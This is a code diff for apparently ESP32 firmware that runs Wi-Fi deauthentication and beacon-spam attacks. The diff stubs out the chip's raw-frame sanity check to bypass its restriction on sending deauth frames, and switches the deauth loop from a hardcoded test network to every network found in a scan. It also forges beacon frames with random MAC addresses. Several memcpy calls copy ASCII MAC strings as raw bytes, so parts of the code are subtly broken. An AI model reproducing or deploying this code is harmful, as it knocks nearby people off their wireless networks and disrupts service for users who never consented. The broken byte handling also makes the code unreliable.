@@ -1,12 +1,15 @@
 #include "globals.h"
 
-extern Logger l;
-extern Led led;
-
 extern "C" {
+	int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
+		return 0;
+	}
 	esp_err_t esp_wifi_set_channel(uint8_t primary, wifi_second_chan_t second);
 	esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
 }
+
+extern Logger l;
+extern Led led;
 
 struct ap {
 	String ssid;
@@ -14,14 +17,14 @@ struct ap {
 };
 
 class WifiManager
-{
+{	
 public:
 	WifiManager() {}
 
 	bool init() {
 		try {
 			this->cfg = WIFI_INIT_CONFIG_DEFAULT();
-			this->ap_config.ap.ssid_hidden = 0;
+			this->ap_config.ap.ssid_hidden = 1;
 			this->ap_config.ap.channel = current_channel;
 			this->ap_config.ap.beacon_interval = 10000;
 			this->ap_config.ap.ssid_len = 0;
@@ -66,14 +69,15 @@ public:
 			return;
 		}
 
-		esp_wifi_set_mode(WIFI_MODE_AP);
+		// esp_wifi_set_mode(WIFI_MODE_AP);
 		led.flash();
 
 		loop_deauth_ap = !loop_deauth_ap;
+		l.log(Logger::INFO, loop_deauth_ap ? "Starting deauth loop" : "Stopping deauth loop");
 	}
 
 	void accessPointLoop() {
-		esp_wifi_set_mode(WIFI_MODE_APSTA);
+		// esp_wifi_set_mode(WIFI_MODE_APSTA);
 		led.flash();
 
 		loop_spam_ap = !loop_spam_ap;
@@ -91,6 +95,8 @@ public:
 		led.flash();
 		
 		for (int i = 0; i < (sizeof(scanned_ap) / sizeof(scanned_ap[0])); i++) {
+			if (scanned_ap[i].bssid == nullptr) break;
+
 			Serial.print("Network SSID: ");
 			Serial.print(scanned_ap[i].ssid);
 			Serial.print("(");
@@ -123,10 +129,12 @@ public:
 
 		if (loop_deauth_ap) {
 			for (int i = 0; i < (sizeof(scanned_ap) / sizeof(scanned_ap[0])); i++) {
+				if (scanned_ap[i].bssid == nullptr) break;
+
 				String ssid = scanned_ap[i].ssid;
 				String bssid = scanned_ap[i].bssid;
 				if (ssid.length() > 0) {
-					sendDeauthPackets(ssid.c_str(), bssid.c_str(), 3);
+					sendDeauthPackets(ssid.c_str(), bssid.c_str(), 1);
 				}
 			}
 		}
@@ -175,8 +183,8 @@ private:
 		l.log(Logger::INFO, "Scanning nearby APs...");
 		int numNetworks = WiFi.scanNetworks();
 		for (int i = 0; i < (numNetworks > 10 ? 10 : numNetworks); i++) {
-			scanned_ap[i].ssid = "imx"; // WiFi.SSID(i);
-        	scanned_ap[i].bssid = "F6:AA:EA:92:ED:CB"; // WiFi.BSSIDstr(i);
+			scanned_ap[i].ssid = WiFi.SSID(i);
+        	scanned_ap[i].bssid = WiFi.BSSIDstr(i);
 		}
 
 		return numNetworks != 0;
@@ -187,8 +195,8 @@ private:
 		if (strlen(bssid) > 0)
 		{
 			l.log(Logger::INFO, "Sending deauth packet to " + String(ssid));
-			for (int i = 0; i < numPackets; i++)
-			{
+			switchChannel();
+			for (int i = 0; i < numPackets; i++) {
 				deauth(bssid);
 			}
 		}
@@ -204,42 +212,40 @@ private:
 
 		uint8_t* mac = utilities::rand_mac();
 		
-		// uint8_t buffer[sizeof(beacon_packet)];
+		// Create a buffer for the packet
+		uint8_t buffer[sizeof(beacon_packet)];
+		// Copy the packet to the buffer
+		memcpy(buffer, beacon_packet, sizeof(beacon_packet));
 
-		memcpy(&beacon_packet[10], mac, 6);
-		memcpy(&beacon_packet[16], mac, 6);
+		// Write the MAC address to the packet (random MAC address)
+		memcpy(&buffer[10], mac, 6);
+		memcpy(&buffer[16], mac, 6);
 
+		// Write the SSID to the packet
 		const char* ssid_c = ssid.c_str();
+		memcpy(&buffer[38], ssid_c, ssidLen);
 
-		memcpy(&beacon_packet[38], ssid_c, ssidLen);
-
-		// memcpy(&buffer[38], ssid.c_str(), ssidLen);
-		beacon_packet[82] = current_channel;
-		beacon_packet[34] = 0x31; // wpa2
-    	// buffer[37] = ssidLen;
-		// memcpy(&buffer[38 + ssidLen], &beacon_packet[70], 39);
+		// Write the channel to the packet
+		buffer[82] = current_channel;
+		// Write the RSN information to the packet
+		buffer[34] = 0x31; // wpa2
 
 		for (int i = 0; i < 3; i++) {
-			esp_wifi_80211_tx(WIFI_IF_STA, beacon_packet, sizeof(beacon_packet), 0);
+			esp_wifi_80211_tx(WIFI_IF_STA, buffer, sizeof(beacon_packet), 0);
 			delay(1);
 		}
-		// delay(100);
 	}
 
 	void deauth(const char* t_mac) // void deauth(const char* ap_mac, const char* t_mac)
 	{
-		switchChannel();
+		// uint8_t buffer[sizeof(deauth_packet)];
+    	// memcpy(buffer, deauth_packet, sizeof(deauth_packet));
 
-		uint8_t buffer[sizeof(deauth_packet)];
-    	memcpy(buffer, deauth_packet, sizeof(deauth_packet));
+		memcpy(&deauth_packet[4], "ff:ff:ff:ff:ff:ff", 6);
+		memcpy(&deauth_packet[10], t_mac, 6);
+		memcpy(&deauth_packet[16], t_mac, 6);
 
-		// memcpy(&buffer[4], t_mac, 6);
-		memcpy(&buffer[10], t_mac, 6);
-		memcpy(&buffer[16], t_mac, 6);
-
-		esp_wifi_80211_tx(WIFI_IF_AP, buffer, sizeof(deauth_packet), false);
-		// buffer[0] = 0xa0;
-		// esp_wifi_80211_tx(WIFI_IF_AP, buffer, sizeof(deauth_frame_default), false);
+		esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauth_packet), false);
 	}
 
 	uint8_t probe_packet[68] = {
